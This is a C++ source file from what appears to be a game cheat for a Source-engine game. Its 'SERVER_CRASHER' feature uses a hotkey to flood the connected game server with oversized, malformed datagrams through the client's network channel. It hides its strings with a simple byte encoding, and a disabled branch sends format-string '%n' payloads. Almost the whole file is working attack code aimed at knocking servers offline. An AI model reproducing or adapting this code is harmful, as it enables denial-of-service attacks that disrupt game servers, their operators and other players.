#include "CreateMove.h"
#include "INetchannelInfo.h"
#include "Netchan.h"


#ifdef SERVER_CRASHER

DWORD AdrOf_NET_SendPacket;
DWORD AdrOf_CNET_SendData;
DWORD AdrOf_CNET_SendDatagram;
char *transmitbitsstr = new char[28]{ 57, 52, 31, 14, 57, 18, 27, 20, 37, 46, 8, 27, 20, 9, 23, 19, 14, 56, 19, 14, 9, 87, 68, 9, 31, 20, 30, 0 }; /*CNetChan_TransmitBits->send*/
char *lolstr = new char[782]{ 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 73, 67, 66, 72, 77, 78, 90, 31, 20, 14, 19, 14, 19, 31, 9, 90, 19, 20, 90, 24, 21, 20, 31, 90, 9, 31, 14, 15, 10, 90, 27, 8, 8, 27, 3, 84, 41, 18, 21, 15, 22, 30, 90, 18, 27, 12, 31, 90, 24, 31, 31, 20, 90, 25, 22, 31, 27, 20, 31, 30, 90, 15, 10, 90, 24, 3, 90, 20, 21, 13, 112, 0 }; /*398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								398274 entities in bone setup array.Should have been cleaned up by now
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								*/


																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								//credits: stackoverflow
char* utf8cpy(char* dst, const char* src, size_t sizeDest)
{
	if (sizeDest) {
		size_t sizeSrc = strlen(src); // number of bytes not including null
		while (sizeSrc >= sizeDest) {

			const char* lastByte = src + sizeSrc; // Initially, pointing to the null terminator.
			while (lastByte-- > src)
				if ((*lastByte & 0xC0) != 0x80) // Found the initial byte of the (potentially) multi-byte character (or found null).
					break;

			sizeSrc = lastByte - src;
		}
		memcpy(dst, src, sizeSrc);
		dst[sizeSrc] = '\0';
	}
	return dst;
}

bool CrashingServer = false;

void CrashServer()
{
#ifdef _DEBUG
	return;
#endif
	//if (!Interfaces::Engine->IsInGame() || LocalPlayer.bIsValveDS)
	{
		static bool enabled = false;
		static float nexttimetoggleable = 0.0f;
		if ((GetAsyncKeyState(VK_END) & (1 << 16)) && Interfaces::Globals->realtime >= nexttimetoggleable)
		{
			enabled = !enabled;
			nexttimetoggleable = Interfaces::Globals->realtime + 0.6f;
		}

		if (enabled)
			DisableAllChk.Checked = true;

		if (enabled || !DisableAllChk.Checked)
		{
			//hidden from view
			if ((GetAsyncKeyState(0x51) & (1 << 16)) || enabled)
			{
				CrashingServer = true;
				//int x = AdrOf_NET_SendPacket;
				DWORD ClientState = (DWORD)ReadInt(pClientState);
				if (ClientState)
				{
					INetChannel *netchan = (INetChannel*)ReadInt((uintptr_t)(ClientState + 0x9C));
					if (netchan)
					{
						//netadrtype_t m_sock = (netadrtype_t&)netchan->m_Socket;
						//const netadr_t *to = (const netadr_t*)&netchan->remote_address;

						//netadrtype_t *socket = (netadrtype_t*)NA_BROADCAST;

						//char packedData[16384];
						int size = (CrashSizeTxt.flValue / 100) * 262160;

						byte *send_buf = new byte[size];

#if 1
						DecStr(transmitbitsstr, 27);
						bf_write send(transmitbitsstr, send_buf, sizeof(send_buf));
						EncStr(transmitbitsstr, 27);
						send.WriteByte(9999);
						DecStr(lolstr, 792);
						send.WriteString(lolstr);
						EncStr(lolstr, 792);
						send.WriteByte(1);
						memset(send_buf, 235, sizeof(send_buf));
						for (int i = 0; i < CrashLoopTxt.iValue; i++)
						{
							int lol = ((int(__thiscall*)(INetChannel*, bf_write *))AdrOf_CNET_SendDatagram)(netchan, &send);
						}
						delete[] send_buf;
						//netchan->m_nOutSequenceNr += rand() % 5;
						//netchan->m_nInReliableState = 0;

#else
						//byte send_buf[512];
						//bf_write send("CNetworkClient::Connect", send_buf, sizeof(send_buf));

						//send.WriteUBitLong(0, 2);
						//send.WriteUBitLong(1, 2);
						//send.WriteString("client disconnected");


						bf_write send("CNetChan_TransmitBits->send", send_buf, sizeof(send_buf));
						//char tmp[512];
						//strcpy(tmp, "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ");
						//auto utfshit = u8"\u0027";
						//utf8cpy(&tmp[91], utfshit, 512);

						send.WriteString("%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n");
						//send.WriteLong(netchan->m_nOutSequenceNr);
						//send.WriteLong(netchan->m_nInSequenceNr);
						//msg->ByteSizeSignedVarInt32(90);
						//msg->WriteOneBitNoCheck(90);
						//oNet_SendPacketFn = (Net_SendPacketFn)AdrOf_NET_SendPacket;
						//oNet_SendPacketFn(netchan, m_sock, to, (const unsigned char*)1, 4, 0, 0.0, false, false);
						//Net_SendPacket()
						//int bytes = send.GetNumBytesWritten();
						//unsigned char *data = send.GetData();

						//netadr_t adr;
						//adr.SetType(NA_BROADCAST);
						//adr.SetPort(27015);
						static float nexttime = 0.0f;
						//nexttime = 0;
						if (Interfaces::Globals->realtime >= nexttime) {
							int lol = ((int(__thiscall*)(INetChannel*, bf_write *))AdrOf_CNET_SendDatagram)(netchan, &send);
							//nexttime = Interfaces::Globals->realtime + 0.05f;
						}
#endif
#if 0
						for (int i = 0; i < 100; i++) {
							int lol = ((int(__cdecl*)(
								INetChannel*,
								netadrtype_t&,
								const int,
								char*,
								int,
								bool))
								AdrOf_NET_SendPacket)(netchan, m_sock, 0, "999999", 9999, false);

							bool result = ((bool(__thiscall*)(
								INetChannel*,
								unsigned char *,
								bool
								))AdrOf_CNET_SendData)(netchan, data, true);

							bool no = result;
							bool ffs = false;
							/*
							int lol = ((int(__cdecl*)
							(
							INetChannel*, //chan
							netadrtype_t&, //sock
							const int, //netadr_t& to
							char*, //data
							int,//, //length
							bool
							))
							AdrOf_NET_SendPacket)(netchan, m_sock, 0, "999999", 9999, false);
							*/
						}
#endif
					}
					else
					{
						//DWORD ClientState = (DWORD)ReadInt(ReadInt(pClientState));
						//INetChannel *netchan = (INetChannel*)ReadInt((uintptr_t)(ClientState + 0x9C);
						//netchan->m_nInReliableState = 1;
					}
				}
			}
			else
			{
				CrashingServer = false;
			}
		}
	}
}
#endif